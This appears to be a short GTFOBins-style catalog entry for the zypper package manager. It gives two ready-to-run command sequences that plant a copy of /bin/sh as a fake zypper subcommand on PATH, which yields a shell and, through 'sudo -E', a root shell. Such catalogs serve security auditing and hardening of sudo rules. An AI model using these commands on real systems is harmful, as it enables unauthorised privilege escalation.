shell.description: This requires '/bin/sh' to be copied to '/usr/lib/zypper/commands/zypper-x' and this usually requires elevated privileges.

shell.code:
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
export PATH=$TF:$PATH
zypper x

sudo.description: This requires '/bin/sh' to be copied to '/usr/lib/zypper/commands/zypper-x' and this usually requires elevated privileges.

sudo.code:
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
export PATH=$TF:$PATH
sudo -E zypper x
